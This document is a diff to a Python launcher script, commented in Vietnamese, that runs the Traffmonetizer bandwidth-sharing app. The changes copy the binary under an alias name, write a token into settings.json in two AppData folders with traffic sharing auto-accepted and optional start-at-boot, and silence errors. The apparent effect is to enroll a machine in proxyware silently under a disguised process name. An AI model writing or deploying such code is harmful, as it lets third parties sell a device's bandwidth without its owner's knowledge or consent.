@@ -23,6 +23,7 @@ import atexit
 import json
 import os
 import shutil
+import stat
 import subprocess
 import sys
 import threading
@@ -77,6 +78,12 @@ def _aliased_path(name):
         dst = os.path.join(dst_dir, PROC_ALIAS + ".exe")
         if not os.path.isfile(dst):
             shutil.copy2(src, dst)
+            # Them bit thuc thi neu thieu (tre Linux/macOS; tren Windows la no-op)
+            try:
+                mode = os.stat(dst).st_mode
+                os.chmod(dst, mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
+            except Exception:
+                pass
         return dst
     except Exception:
         # That bai (khong quyen ghi...) -> chay tu file goc nhu cu
@@ -103,40 +110,55 @@ def _fatal(message):
 
 
 def _preseed_traffmonetizer():
-    """Ghi Token vao %APPDATA%\\traffmonetizer\\settings.json TRUOC khi chay app.
+    """Ghi Token vao settings.json cua Traffmonetizer TRUOC khi chay app.
 
-    Cau truc settings.json duoc xac dinh bang cach phan tich truc tiep binary
-    Traffmonetizer (DataContractJsonSerializer, cac DataMember: Token,
-    Accepting, StartWithWindows - giu nguyen ten property, PascalCase).
+    Ghi vao CA HAI vi tri de chac chan dung tren moi thiet bi Windows:
+      - %APPDATA%\\traffmonetizer\\settings.json        (Roaming)
+      - %LOCALAPPDATA%\\traffmonetizer\\settings.json   (Local)
+    Binary Traffmonetizer dung Environment.GetFolderPath(SpecialFolder.*)
+    + DataContractJsonSerializer (cac DataMember: Token, Accepting,
+    StartWithWindows - giu nguyen ten property, PascalCase).
     App doc file nay luc khoi dong: co Token -> bo qua man hinh login,
     Accepting = True -> tu dong chap nhan chia se traffic (tu ket noi).
     """
     if not TM_PRESEED or not TM_TOKEN:
         return
     try:
+        roots = []
         appdata = os.environ.get("APPDATA")
-        if not appdata:
+        if appdata:
+            roots.append(appdata)
+        local = os.environ.get("LOCALAPPDATA")
+        if local and os.path.normcase(local) != os.path.normcase(appdata or ""):
+            roots.append(local)
+        if not roots:
             return
-        settings_dir = os.path.join(appdata, "traffmonetizer")
-        os.makedirs(settings_dir, exist_ok=True)
-        settings_path = os.path.join(settings_dir, "settings.json")
 
-        data = {}
-        if os.path.isfile(settings_path):
+        for root in roots:
             try:
-                with open(settings_path, "r", encoding="utf-8-sig") as f:
-                    loaded = json.load(f)
-                if isinstance(loaded, dict):
-                    data = loaded
-            except Exception:
+                settings_dir = os.path.join(root, "traffmonetizer")
+                os.makedirs(settings_dir, exist_ok=True)
+                settings_path = os.path.join(settings_dir, "settings.json")
+
                 data = {}
+                if os.path.isfile(settings_path):
+                    try:
+                        with open(settings_path, "r", encoding="utf-8-sig") as f:
+                            loaded = json.load(f)
+                        if isinstance(loaded, dict):
+                            data = loaded
+                    except Exception:
+                        data = {}
 
-        data["Token"] = TM_TOKEN
-        data["Accepting"] = True
-        data["StartWithWindows"] = bool(TM_START_WITH_WINDOWS)
+                data["Token"] = TM_TOKEN
+                data["Accepting"] = True
+                data["StartWithWindows"] = bool(TM_START_WITH_WINDOWS)
 
-        with open(settings_path, "w", encoding="utf-8") as f:
-            json.dump(data, f, ensure_ascii=False)
+                with open(settings_path, "w", encoding="utf-8") as f:
+                    json.dump(data, f, ensure_ascii=False)
+            except Exception:
+                # Loi o 1 vi tri -> van thu vi tri con lai
+                continue
     except Exception:
         # Khong bao loi lam dung luong chinh - app van chay, chi la khong auto-login
         pass
@@ -180,7 +202,14 @@ def _kill_tree(proc):
                 creationflags=subprocess.CREATE_NO_WINDOW,
             )
         else:
-            proc.terminate()
+            try:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=3)
+                except Exception:
+                    proc.kill()
+            except Exception:
+                pass
     except Exception:
         pass
 
